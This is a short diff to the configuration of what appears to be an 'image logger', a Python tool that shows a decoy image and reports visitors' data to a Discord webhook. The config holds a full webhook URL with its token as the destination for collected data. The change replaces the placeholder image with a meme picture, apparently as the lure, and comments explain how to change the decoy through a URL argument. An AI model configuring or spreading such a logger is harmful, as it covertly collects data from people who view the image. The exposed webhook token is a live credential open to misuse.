@@ -10,7 +10,7 @@ __author__ = "Edinaz"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1386096428019093591/yx_D3XM9_FwaolJpoRhpdjhLQiyqRkzkAFw84R0VzVEeNvQxvuB_odGVjZbQibqmsJjo",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://i.kym-cdn.com/entries/icons/original/000/047/549/kurt_angle_meme.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
